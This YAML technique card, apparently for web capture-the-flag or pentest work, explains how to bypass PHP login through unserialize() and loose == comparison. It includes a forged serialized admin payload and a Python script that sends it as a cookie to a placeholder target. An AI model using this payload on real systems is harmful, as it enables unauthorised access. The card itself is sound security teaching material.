name: php_type_juggling_auth_bypass
category: web
tags: [php, type_juggling, deserialization, auth_bypass, loose_comparison]
indicators:
  - "PHP unserialize() deserializes user input"
  - "Uses == loose comparison instead of ==="
  - "Password verification logic"
  - "Serialized data stored in Cookie"

tricks:
  - name: "Step 1: Identify deserialization entry"
    when: "Analyze source code"
    how: "Cookie 'creds' is base64 decoded then unserialized"
    payload: |
      $auth = unserialize(base64_decode($_COOKIE['creds']));

  - name: "Step 2: Find loose comparison vulnerability"
    when: "Analyze authentication logic"
    how: "Uses == instead of === for password comparison"
    payload: |
      $auth['password'] == $password  // Loose comparison

  - name: "Step 3: Understand PHP type juggling"
    when: "Need to bypass password verification"
    how: "PHP loose comparison quirks"
    payload: |
      true == "any_non_empty_string" => true
      0 == "string_not_starting_with_number" => true

  - name: "Step 4: Craft malicious serialized data"
    when: "Execute attack"
    how: "Set password to boolean true (b:1)"
    payload: |
      a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}

  - name: "Step 5: Submit payload"
    when: "Execute attack"
    how: "Base64 encode serialized data, set as Cookie"
    payload: |
      import base64
      payload = 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}'
      cookie = base64.b64encode(payload.encode()).decode()
      requests.get('http://TARGET/', cookies={"creds": cookie})
